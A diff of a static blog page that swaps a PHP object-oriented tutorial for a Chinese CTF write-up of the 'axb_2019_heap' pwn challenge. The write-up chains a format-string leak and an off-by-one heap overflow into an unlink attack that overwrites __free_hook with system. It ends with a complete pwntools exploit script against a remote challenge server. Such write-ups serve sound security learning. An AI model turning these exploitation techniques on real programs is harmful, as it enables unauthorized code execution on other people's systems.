@@ -165,7 +165,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                PHP面向对象学习
+                                axb_2019_heap
                             </h1>
                             
                                 <!--en-->
@@ -178,14 +178,22 @@
                                 Date: <a href="#">2020-09-07</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">2.4
+                                    href="#">4.2
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">635</a></span>
+                                    <span class="post-words">words:<a href="#">904</a></span>
                                     
                                         <span class="post-category">
                                 Category:
                                 
-                                <a href="https://l3mon629.github.io/tag/mGjsDXVh8/">PHP学习</a>
+                                <a href="https://l3mon629.github.io/tag/nF1H8dVWQ/">组合攻击</a>
+                                
+                                <a href="https://l3mon629.github.io/tag/Yg2BsmPyIU/">format-string</a>
+                                
+                                <a href="https://l3mon629.github.io/tag/tc2bM4krw/">heap</a>
+                                
+                                <a href="https://l3mon629.github.io/tag/mizqxcXow6/">unlink</a>
+                                
+                                <a href="https://l3mon629.github.io/tag/Q22QNSAxW/">off-by-one</a>
                                 
                             </span>
                                         
@@ -197,136 +205,138 @@
                         </header>
                         
                         <div class="post-content">
-                            <h1 id="面向对象基础">面向对象基础</h1>
-<h2 id="面向对象的关键字说明">面向对象的关键字说明</h2>
-<p>面向对象关键字：基于面向对象开发时，所用到的一些关键字，用来表明一些结构和类型</p>
-<ul>
-<li>类：定义面向对象主体的最外层结构，包裹主体的数据和功能，共性事物的代表</li>
-<li>对象：是某类事物的具体代表，是实际数据和功能操作的具体单元，也被称之为实例</li>
-<li>实例化：new，从一个抽象的概念得到符合抽象概念的具体实例的过程</li>
-<li>类成员：member，指类class中的所有内容，类成员有三种
-<ul>
-<li>属性：在class中创建的变量</li>
-<li>方法：class结构中创建的函数</li>
-<li>类常量：const，在class中创建的常量</li>
-</ul>
-</li>
-</ul>
-<h2 id="面向对象简单技术实现">面向对象简单技术实现</h2>
-<ul>
-<li>class 声名 类</li>
-<li>类名：驼峰命名</li>
-<li>大括号：只有在大括号里面的东西才是类成员，大括号里面的大括号不算</li>
-</ul>
-<pre><code class="language-php">class name{
-
-}
+                            <p>发现一个很有意思的题目，学到了一些东西，特此记录一下</p>
+<h2 id="逆向">逆向</h2>
+<p>main函数：<br>
+在format_string里面有格式化字符串漏洞<br>
+<img src="https://l3mon629.github.io/post-images/1599466474723.png" alt="" loading="lazy"><br>
+add函数：<br>
+很长，大体意思就是bss段上有一个key，如果key == 43，就可以申请fastbin大小的chunk，否则不可以<br>
+<img src="https://l3mon629.github.io/post-images/1599466507738.png" alt="" loading="lazy"><br>
+get_input里面存在off-by-one漏洞，别的函数就不看了，节省时间<br>
+<img src="https://l3mon629.github.io/post-images/1599466606348.png" alt="" loading="lazy"></p>
+<h2 id="思路">思路</h2>
+<p>这个题目在bss上是有heaparray的，但是保护全开，有个format string漏洞<br>
+思路就出来了，我们可以利用格式化字符串泄漏相关地址，然后实施unlink攻击<br>
+我们调试一下，直接定位到printf的位置单步调试<br>
+注意，调试格式化字符串漏洞的时候一定要进入到输入点之前才能确定栈上的位置<br>
+<img src="https://l3mon629.github.io/post-images/1599466836576.png" alt="" loading="lazy"><br>
+tips：在pwndbg里面我们可以利用命令fmtarg来确定是格式化字符串的第几个参数</p>
+<pre><code>fmtarg 0x7ffdb76453e8
 </code></pre>
-<ul>
-<li>实例化：产生对象</li>
-</ul>
-<pre><code class="language-PHP">new 类名;
-new 类名();     #较多
+<p>main+28的地方发现是第十一个参数，__libc_start_main+20的地方发现是第十五个参数<br>
+但是注意，我们在打格式化的时候，%11p只是取栈的地址，要想取栈地址里面存的值要用$p<br>
+利用main+28可以泄漏出heaparray的地址，具体做法如下</p>
+<pre><code>.text:000000000000116A
+.text:000000000000116A ; int __cdecl main(int argc, const char **argv, const char **envp)
+.text:000000000000116A                 public main
+.text:000000000000116A main            proc near               ; DATA XREF: _start+1D↑o
+.text:000000000000116A
 </code></pre>
-<ul>
-<li>对象：一般用变量保存</li>
-</ul>
-<pre><code>$object = new classname();
+<p>可以看到在开启pie的情况下main的相对加载位置在0x116A处</p>
+<pre><code>.bss:0000000000202060                 public note
+.bss:0000000000202060 note            db    ? ;               ; DATA XREF: add_note+DA↑o
+.bss:0000000000202060                                         ; add_note+F4↑o ...
 </code></pre>
-<p>步骤：1，根据需求产生类的结构 2，需要使用时实例化<br>
-demo</p>
-<pre><code class="language-php">&lt;?php
-
-class Nothing{
-
-}
-
-$nothing = new Nothing();
-var_dump($nothing);
+<p>heaparray位于0x202060处，所以heaparray在被加载进内存的地址就等于(main+28)-28-0x116A+0x202060的地址<br>
+利用__libc_start_main来泄漏libc的地址</p>
+<p>思路就是申请三个chunk，然后利用off-by-one溢出一个字节unlink到heaparray，然后改写__free_hook为system<br>
+为什么不改写__malloc_hook呢？？因为程序内部存在检查，如果改写malloc相关的函数会报出&quot;no hacker&quot;之类的字符串<br>
+为什么不改写free呢？？因为调试发现会crash掉</p>
+<p>tips：unlink的时候注意</p>
+<pre><code>chunk0
+chunk1
+chunk2
 </code></pre>
-<p>运行结果<br>
-<img src="https://l3mon629.github.io/post-images/1599440446099.png" alt="" loading="lazy"></p>
-<h2 id="类成员">类成员</h2>
-<ul>
-<li>属性和方法需要使用访问修饰限定修饰符，暂时使用public</li>
-<li>成员访问：属性和方法都属于对象访问，类常量属于类访问
-<ul>
-<li>对象访问属性和方法，使用-&gt;<br>
-自己简单写个例子好了</li>
-</ul>
-</li>
-</ul>
-<pre><code class="language-php">&lt;?php
-class Student{
-    const STUDENT_NUMBER = 27;
-    public $name;
-    public $number;
-    public $sex;
-    public function print(){
-        echo __CLASS__;
-        #魔术方法，打印类名
-    }
-}
+<p>我们通常是先构造fakechunk，然后free(1)，但是我们伪造的fd和bk注意是heaparray[0] - 0x18和0x10的位置</p>
+<p>本地能打通，远程一直报timeout的错误，用别人的脚本也这样，愁人</p>
+<h2 id="exp">exp</h2>
+<pre><code class="language-python">from pwn import *
+
+local = 0
+if local == 1:
+	p = process('./axb_2019_heap')
+else:
+	p = remote('node3.buuoj.cn',28566)
+
+elf = ELF('./axb_2019_heap')
+libc = ELF('./libc.so.6')
+
+def dbg():
+	context.log_level = 'debug'
+
+def fmt(name):
+	p.recvuntil('Enter your name:')
+	p.sendline(name)
+
+def add(index,size,content):
+	p.sendlineafter('&gt;&gt; ','1')
+	p.sendlineafter('Enter the index you want to create (0-10):',str(index))
+	p.sendlineafter('Enter a size:',str(size))
+	p.sendlineafter('Enter the content:',content)
+
+def free(index):
+	p.sendlineafter('&gt;&gt; ','2')
+	p.sendlineafter('Enter an index:',str(index))
+
+def edit(index,content):
+	p.sendlineafter('&gt;&gt; ','4')
+	p.sendlineafter('Enter an index:',str(index))
+	p.sendafter('Enter the content:',content)
+
+#dbg()
+print(&quot;======= step 1 : by use fmtstr leak address libc + bss =======&quot;)
+fmt('%11$p%15$p')
+p.recvuntil('Hello,')
+main = int(p.recv(15),16) - 28
+__libc_start_main = int(p.recv(15),16) - 240
+print(&quot;main ---&gt; &quot; + hex(main))
+print(&quot;__libc_start_main ----&gt; &quot; + hex(__libc_start_main))
+
+heaparray = main - 0x116A + 0x202060
+print(&quot;heaparray in bss(DATA) ----&gt; &quot; + hex(heaparray))
+libc_base = __libc_start_main - libc.sym['__libc_start_main']
+print(&quot;libc base ----&gt;&quot; + hex(libc_base))
+
+add(0,0x98,'A')		#chunk0
+add(1,0xa0,'B')		#chunk1
+add(2,0x90,'/bin/sh\x00')	#chunk2
+
+print(&quot;======== step 2: unlink =========&quot;)
+fd = heaparray - 0x18
+bk = heaparray - 0x10
+chunk0 = p64(0) + p64(0x91) + p64(fd) + p64(bk) +p64(0) * 14 + p64(0x90) + p64(0xb0)
+edit(0,chunk0)
+free(1)
+
+print(&quot;======= step 3: attack __free_hook ======&quot;)
+free = libc_base + libc.symbols['__free_hook']
+system = libc_base + libc.symbols['system']
+
+payload = p64(0) * 3 + p64(free) + p64(0x8) + b'\n'
+print(&quot;这里写入8是因为我们要在bss上伪造chunksize，我们需要写入8字节的payload，即下文的p64(system)&quot;)            
+edit(0,payload)
+
+payload = p64(system)
+print(hex(system))
+
+#dbg()
+edit(0,payload)
+
+p.sendline('2')	
+p.sendline('2')
+p.interactive()
 </code></pre>
-<p>成员访问方法：必须通过对象访问<br>
-属性访问：增删改查</p>
-<pre><code class="language-php">&lt;?php
-class Student{
-    const STUDENT_NUMBER = 27;
-    public $name;
-    public $number;
-    public $sex;
-    public function print(){
-        echo &quot;\n&quot;.__CLASS__;
-        #魔术方法，打印类名
-    }
-}
-
-$stu = new Student();
-#增
-$stu -&gt; tall;
-$stu -&gt; height = 180;
-
-#删除
-unset($stu -&gt; number);
-
-#改
-$stu -&gt; name = &quot;Tom&quot;;
-
-#查
-var_dump($stu -&gt; name);
-echo &quot;\n&quot;;
-var_dump($stu);
-</code></pre>
-<p>运行情况<br>
-<img src="https://l3mon629.github.io/post-images/1599441707970.png" alt="" loading="lazy"><br>
-访问方法</p>
-<pre><code class="language-php">$stu -&gt; print();
-</code></pre>
-<p>打印出来类的名字<br>
-<img src="https://l3mon629.github.io/post-images/1599441843593.png" alt="" loading="lazy"></p>
-<p>通常，我们访问属性，只用改和查就够了</p>
-<h2 id="访问修饰限定符">访问修饰限定符</h2>
-<p>概念<br>
-访问修饰限定符：用在属性或者方法前修饰的关键字，是用来控制属性或者方法的访问位置</p>
-<ul>
-<li>分类</li>
-<li>public，公有，类内类外都可</li>
-<li>protected，受保护，只允许在相关类内部访问</li>
-<li>private，私有，只允许在定义类内部访问</li>
-</ul>
-<p>方法可以没有没有修饰限定符，默认public</p>
 
                         </div>
                         
                             <div class="post-toc">
                                 <ul class="markdownIt-TOC">
-<li><a href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">面向对象基础</a>
+<li>
 <ul>
-<li><a href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97%E8%AF%B4%E6%98%8E">面向对象的关键字说明</a></li>
-<li><a href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%AE%80%E5%8D%95%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0">面向对象简单技术实现</a></li>
-<li><a href="#%E7%B1%BB%E6%88%90%E5%91%98">类成员</a></li>
-<li><a href="#%E8%AE%BF%E9%97%AE%E4%BF%AE%E9%A5%B0%E9%99%90%E5%AE%9A%E7%AC%A6">访问修饰限定符</a></li>
+<li><a href="#%E9%80%86%E5%90%91">逆向</a></li>
+<li><a href="#%E6%80%9D%E8%B7%AF">思路</a></li>
+<li><a href="#exp">exp</a></li>
 </ul>
 </li>
 </ul>
@@ -344,7 +354,7 @@ var_dump($stu);
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://l3mon629.github.io/post/php-mian-xiang-dui-xiang-xue-xi/">https://l3mon629.github.io/post/php-mian-xiang-dui-xiang-xue-xi/</a></span>
+                                                <span><a href="https://l3mon629.github.io/post/axb_2019_heap/">https://l3mon629.github.io/post/axb_2019_heap/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -359,9 +369,9 @@ var_dump($stu);
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/php-mian-xiang-dui-xiang-xue-xi/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/php-mian-xiang-dui-xiang-xue-xi/&sharesource=qzone&title=PHP面向对象学习&pics=https://l3mon629.github.io/images/avatar.png?v=1599467699089&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/php-mian-xiang-dui-xiang-xue-xi/&sharesource=weibo&title=PHP面向对象学习 + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1599467699089 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/axb_2019_heap/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/axb_2019_heap/&sharesource=qzone&title=axb_2019_heap&pics=https://l3mon629.github.io/images/avatar.png?v=1599467699089&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/axb_2019_heap/&sharesource=weibo&title=axb_2019_heap + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1599467699089 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -371,8 +381,24 @@ var_dump($stu);
                                                                         <span class="tag ">
                         
                         
-                        <a href="https://l3mon629.github.io/tag/mGjsDXVh8/">#
-                                                PHP学习
+                        <a href="https://l3mon629.github.io/tag/nF1H8dVWQ/">#
+                                                组合攻击
+                                                    </a>
+                                                    
+                        <a href="https://l3mon629.github.io/tag/Yg2BsmPyIU/">#
+                                                format-string
+                                                    </a>
+                                                    
+                        <a href="https://l3mon629.github.io/tag/tc2bM4krw/">#
+                                                heap
+                                                    </a>
+                                                    
+                        <a href="https://l3mon629.github.io/tag/mizqxcXow6/">#
+                                                unlink
+                                                    </a>
+                                                    
+                        <a href="https://l3mon629.github.io/tag/Q22QNSAxW/">#
+                                                off-by-one
                                                     </a>
                                                     
                                                         
@@ -388,13 +414,9 @@ var_dump($stu);
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://l3mon629.github.io/post/axb_2019_heap/">
-                                                                                            axb_2019_heap
-                                                                                        </a>
-                                                                                        
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/glibc-yuan-ma-xue-xi/">
-                                                                                                    glibc源码学习
+                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/php-mian-xiang-dui-xiang-xue-xi/">
+                                                                                                    PHP面向对象学习
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
